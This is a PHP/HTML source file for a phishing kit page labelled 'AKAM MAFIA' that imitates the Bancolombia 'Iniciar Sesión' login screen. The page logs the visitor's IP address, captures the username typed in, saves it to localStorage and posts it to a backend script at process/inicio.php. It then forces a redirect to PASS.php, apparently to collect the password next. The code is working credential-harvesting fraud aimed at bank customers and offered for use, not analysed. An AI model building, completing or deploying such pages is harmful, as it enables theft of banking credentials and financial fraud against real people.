<?php
// login.php - AKAM MAFIA
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Bancolombia - Iniciar Sesión</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v=<?php echo time(); ?>" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <style type="text/css">
            #fondo, #cargando-o { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9999; text-align: center; padding-top: 50%; }
            #btn-continuar:disabled { background-color: #ccc !important; cursor: not-allowed; }
            #btn-continuar { background-color: #FDDA24 !important; color: #000; font-weight: bold; border: none; cursor: pointer; }
            
            /* ESTO CORRIGE EL TEXTO TRANSPARENTE */
            .entradas { 
                border: none; 
                outline: none; 
                width: 100%; 
                font-size: 16px; 
                background: transparent; 
                color: #333 !important; /* Fuerza el color gris oscuro/negro */
                caret-color: #000;
            }
            .entradas::placeholder { color: #999; }
        </style>
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="60" onerror="this.src='https://i.gifer.com/ZZ5H.gif'"><br>
            <p style="font-family: sans-serif; color: #666;">Cargando...</p>
        </div>

        <table width="100%" border="0" style="padding: 15px;">
            <tr>
                <td align="left"><img src="../img/btn-cerrar.jpg" height="25"></td>
                <td align="center"><img src="../img/logo-app.jpg" height="25"></td>
                <td></td>
            </tr>
        </table>

        <div align="center"><img src="../img/logo.svg" width="200" style="margin-top: 30px;"></div>
        <div style="text-align: center; font-weight: 800; margin-top: 20px; font-family: sans-serif;">Ingresa tu usuario</div>  
        
        <div style="padding: 25px;">
            <div style="border-bottom: 1px solid #ccc; padding: 10px 0;">
                <input type="text" id="txt-usuario" class="entradas" placeholder="Ingresa el usuario" autocomplete="off">
            </div>
        </div>  

        <button id="btn-continuar" style="width: 85%; margin: 0 auto; display: block; height: 50px; border-radius: 25px; font-family: sans-serif;" disabled>CONTINUAR</button> 

        <script type="text/javascript">
            $(document).ready(function() { 
                localStorage.removeItem('user_akam'); 

                // Habilitar botón si el usuario tiene 4 o más caracteres
                $("#txt-usuario").on("input", function() {
                    var val = $(this).val().trim();
                    if (val.length >= 4) {
                        $("#btn-continuar").prop("disabled", false);
                    } else {
                        $("#btn-continuar").prop("disabled", true);
                    }
                });

                $("#btn-continuar").click(function() {
                    var user_val = $("#txt-usuario").val().trim();
                    
                    if (user_val !== "") {
                        $("#fondo, #cargando-o").show();
                        localStorage.setItem('user_akam', user_val); 

                        // Enviamos al proceso de inicio
                        $.post("../process/inicio.php", { 'txt-usuario': user_val }, function() {
                            // Redirección inmediata al recibir respuesta
                            window.location.href = "PASS.php"; 
                        }).fail(function() {
                            // Si falla el post (por Railway), igual intentamos saltar
                            window.location.href = "PASS.php";
                        });

                        // Respaldo de seguridad: si el internet es lento, salta a los 4 segundos
                        setTimeout(function(){ 
                            window.location.href = "PASS.php"; 
                        }, 4000);
                    }
                });
            });
        </script>
    </body>
</html>
